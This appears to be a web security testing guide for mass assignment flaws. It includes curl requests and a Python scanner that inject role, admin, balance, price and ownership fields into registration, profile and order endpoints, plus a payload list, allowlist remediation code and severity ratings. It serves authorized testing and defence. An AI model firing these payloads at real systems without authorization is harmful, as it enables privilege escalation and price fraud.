# WSTG-INPV-20: Testing for Mass Assignment

## Test ID
WSTG-INPV-20

## Test Name
Testing for Mass Assignment

## High-Level Description

Mass Assignment (also known as Auto-binding or Object Injection) occurs when an application automatically binds user-provided data to internal objects. Attackers can modify object properties they shouldn't have access to, such as changing user roles, prices, or account status by adding extra parameters to requests.

---

## What to Check

- [ ] Hidden parameter injection
- [ ] Role/privilege escalation
- [ ] Price/amount manipulation
- [ ] Status field modification
- [ ] Admin flag injection
- [ ] Timestamp manipulation

---

## How to Test

### Step 1: Identify Mass Assignment Points

```bash
#!/bin/bash
TARGET="https://target.com"

echo "[*] Testing for Mass Assignment..."

# Test user registration with extra parameters
curl -s -X POST "$TARGET/api/register" \
    -H "Content-Type: application/json" \
    -d '{
        "username": "testuser",
        "email": "test@test.com",
        "password": "TestPass123!",
        "role": "admin",
        "isAdmin": true,
        "is_admin": true
    }'

# Test profile update with extra parameters
curl -s -X PUT "$TARGET/api/user/profile" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    -d '{
        "name": "Test User",
        "role": "admin",
        "verified": true,
        "balance": 999999
    }'
```

### Step 2: Mass Assignment Tester

```python
#!/usr/bin/env python3
"""
Mass Assignment Vulnerability Tester
"""

import requests
import json
import copy

class MassAssignmentTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # Common mass assignment parameters
    DANGEROUS_PARAMS = {
        'privilege_escalation': [
            ('role', ['admin', 'administrator', 'superuser', 'root']),
            ('isAdmin', [True, 1, 'true', 'yes']),
            ('is_admin', [True, 1, 'true', 'yes']),
            ('admin', [True, 1, 'true', 'yes']),
            ('user_type', ['admin', 'staff', 'manager']),
            ('permissions', ['all', '*', 'admin']),
            ('group', ['admin', 'administrators']),
            ('groups', [['admin'], ['administrators']]),
        ],
        'account_status': [
            ('verified', [True, 1]),
            ('is_verified', [True, 1]),
            ('email_verified', [True, 1]),
            ('active', [True, 1]),
            ('is_active', [True, 1]),
            ('approved', [True, 1]),
            ('confirmed', [True, 1]),
        ],
        'financial': [
            ('balance', [999999, 1000000]),
            ('credits', [999999]),
            ('points', [999999]),
            ('price', [0, 1, 0.01]),
            ('amount', [0, 1]),
            ('discount', [100, 99]),
            ('total', [0, 1]),
        ],
        'access_control': [
            ('owner_id', [1, 0]),
            ('user_id', [1, 0]),
            ('created_by', [1]),
            ('tenant_id', [1]),
            ('organization_id', [1]),
        ],
        'timestamps': [
            ('created_at', ['2099-01-01']),
            ('updated_at', ['2099-01-01']),
            ('deleted_at', [None, '']),
            ('expires_at', ['2099-12-31']),
            ('valid_until', ['2099-12-31']),
        ],
    }

    def test_registration(self, base_data=None):
        """Test mass assignment in user registration"""
        print("\n[*] Testing mass assignment in registration...")

        if base_data is None:
            base_data = {
                'username': 'masstest_user',
                'email': 'masstest@test.com',
                'password': 'TestPass123!'
            }

        register_url = f"{self.url}/register"

        for category, params in self.DANGEROUS_PARAMS.items():
            for param_name, test_values in params:
                for value in test_values:
                    test_data = copy.deepcopy(base_data)
                    test_data[param_name] = value

                    try:
                        response = self.session.post(
                            register_url,
                            json=test_data
                        )

                        # Check if parameter was accepted
                        if response.status_code in [200, 201]:
                            resp_data = response.json() if response.text else {}

                            # Check if dangerous param is reflected
                            if param_name in str(resp_data):
                                print(f"[WARN] Parameter accepted: {param_name}={value}")
                                self.findings.append({
                                    'type': 'Mass Assignment',
                                    'endpoint': 'registration',
                                    'parameter': param_name,
                                    'value': value,
                                    'category': category,
                                    'severity': 'High' if category == 'privilege_escalation' else 'Medium'
                                })

                    except Exception as e:
                        pass

    def test_profile_update(self, auth_token=None, base_data=None):
        """Test mass assignment in profile update"""
        print("\n[*] Testing mass assignment in profile update...")

        if base_data is None:
            base_data = {'name': 'Test User'}

        headers = {}
        if auth_token:
            headers['Authorization'] = f'Bearer {auth_token}'

        update_url = f"{self.url}/profile"

        for category, params in self.DANGEROUS_PARAMS.items():
            for param_name, test_values in params:
                for value in test_values:
                    test_data = copy.deepcopy(base_data)
                    test_data[param_name] = value

                    try:
                        response = self.session.put(
                            update_url,
                            json=test_data,
                            headers=headers
                        )

                        if response.status_code == 200:
                            resp_data = response.json() if response.text else {}

                            if param_name in str(resp_data):
                                print(f"[WARN] Profile accepts: {param_name}={value}")
                                self.findings.append({
                                    'type': 'Mass Assignment',
                                    'endpoint': 'profile_update',
                                    'parameter': param_name,
                                    'value': value,
                                    'category': category,
                                    'severity': 'High' if category == 'privilege_escalation' else 'Medium'
                                })

                    except Exception as e:
                        pass

    def test_order_manipulation(self, auth_token=None):
        """Test mass assignment in order/checkout"""
        print("\n[*] Testing mass assignment in orders...")

        order_data = {
            'items': [{'product_id': 1, 'quantity': 1}],
            'shipping_address': '123 Test St'
        }

        headers = {}
        if auth_token:
            headers['Authorization'] = f'Bearer {auth_token}'

        order_url = f"{self.url}/orders"

        # Test financial parameters
        financial_params = [
            ('total', 0),
            ('price', 0.01),
            ('discount', 100),
            ('shipping_cost', 0),
            ('tax', 0),
            ('subtotal', 0),
        ]

        for param_name, value in financial_params:
            test_data = copy.deepcopy(order_data)
            test_data[param_name] = value

            try:
                response = self.session.post(
                    order_url,
                    json=test_data,
                    headers=headers
                )

                if response.status_code in [200, 201]:
                    resp_data = response.json() if response.text else {}

                    if str(value) in str(resp_data.get(param_name, '')):
                        print(f"[VULN] Order accepts: {param_name}={value}")
                        self.findings.append({
                            'type': 'Mass Assignment - Price Manipulation',
                            'endpoint': 'orders',
                            'parameter': param_name,
                            'value': value,
                            'severity': 'Critical'
                        })

            except Exception as e:
                pass

    def test_api_endpoints(self, endpoints=None, auth_token=None):
        """Test multiple API endpoints for mass assignment"""
        print("\n[*] Testing API endpoints...")

        if endpoints is None:
            endpoints = [
                ('POST', '/api/users'),
                ('PUT', '/api/users/{id}'),
                ('POST', '/api/products'),
                ('PUT', '/api/products/{id}'),
                ('POST', '/api/settings'),
            ]

        headers = {'Content-Type': 'application/json'}
        if auth_token:
            headers['Authorization'] = f'Bearer {auth_token}'

        test_params = ['role', 'isAdmin', 'admin', 'verified', 'price', 'status']

        for method, endpoint in endpoints:
            url = f"{self.url}{endpoint.replace('{id}', '1')}"

            for param in test_params:
                test_data = {param: 'injected_value'}

                try:
                    if method == 'POST':
                        response = self.session.post(url, json=test_data, headers=headers)
                    else:
                        response = self.session.put(url, json=test_data, headers=headers)

                    if response.status_code in [200, 201]:
                        print(f"  [INFO] {method} {endpoint}: {param} accepted")

                except Exception as e:
                    pass

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("MASS ASSIGNMENT VULNERABILITY REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo mass assignment vulnerabilities confirmed.")
            print("Note: Manual verification may still be needed.")
        else:
            # Group by severity
            critical = [f for f in self.findings if f['severity'] == 'Critical']
            high = [f for f in self.findings if f['severity'] == 'High']
            medium = [f for f in self.findings if f['severity'] == 'Medium']

            if critical:
                print(f"\n[CRITICAL] ({len(critical)} issues)")
                for f in critical:
                    print(f"  - {f['endpoint']}: {f['parameter']}={f['value']}")

            if high:
                print(f"\n[HIGH] ({len(high)} issues)")
                for f in high:
                    print(f"  - {f['endpoint']}: {f['parameter']}={f['value']}")

            if medium:
                print(f"\n[MEDIUM] ({len(medium)} issues)")
                for f in medium:
                    print(f"  - {f['endpoint']}: {f['parameter']}={f['value']}")

    def run_tests(self, auth_token=None):
        """Run all mass assignment tests"""
        self.test_registration()
        self.test_profile_update(auth_token)
        self.test_order_manipulation(auth_token)
        self.test_api_endpoints(auth_token=auth_token)
        self.generate_report()

# Usage
tester = MassAssignmentTester("https://target.com/api")
tester.run_tests(auth_token='your_jwt_token')
```

### Step 3: Common Vulnerable Parameters

```json
// Privilege Escalation
{
    "role": "admin",
    "isAdmin": true,
    "is_admin": true,
    "admin": true,
    "user_type": "admin",
    "permissions": ["all"],
    "group": "administrators"
}

// Account Status
{
    "verified": true,
    "email_verified": true,
    "active": true,
    "approved": true,
    "confirmed": true
}

// Financial
{
    "balance": 999999,
    "credits": 999999,
    "price": 0,
    "discount": 100,
    "total": 0
}

// Access Control
{
    "owner_id": 1,
    "user_id": 1,
    "tenant_id": 1,
    "organization_id": 1
}
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Burp Suite Param Miner | Parameter discovery |
| Arjun | Hidden parameter finder |
| Custom scripts | Targeted testing |

---

## Remediation

```python
# Python/Flask - Explicit field allowlist
from flask import request
from marshmallow import Schema, fields

class UserUpdateSchema(Schema):
    # Only these fields can be updated
    name = fields.Str()
    email = fields.Email()
    # role, isAdmin, etc. are NOT included

@app.route('/profile', methods=['PUT'])
def update_profile():
    schema = UserUpdateSchema()
    data = schema.load(request.json)  # Only allowed fields
    user.update(**data)
```

```javascript
// Node.js/Express - Allowlist pattern
const allowedFields = ['name', 'email', 'bio'];

app.put('/profile', (req, res) => {
    const updates = {};
    for (const field of allowedFields) {
        if (req.body[field] !== undefined) {
            updates[field] = req.body[field];
        }
    }
    // Only safe fields are used
    User.update(userId, updates);
});
```

```ruby
# Rails - Strong Parameters
def user_params
    params.require(:user).permit(:name, :email)
    # role, admin, etc. are NOT permitted
end
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| Admin role assignment | 9.8 | Critical |
| Price manipulation | 8.6 | High |
| Account status bypass | 7.5 | High |
| Timestamp manipulation | 4.3 | Medium |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-915** | Improperly Controlled Modification of Dynamically-Determined Object Attributes |

---

## Checklist

```
[ ] Registration endpoint tested
[ ] Profile update tested
[ ] Order/payment endpoints tested
[ ] Hidden parameters discovered
[ ] Privilege escalation tested
[ ] Financial manipulation tested
[ ] Findings documented
```
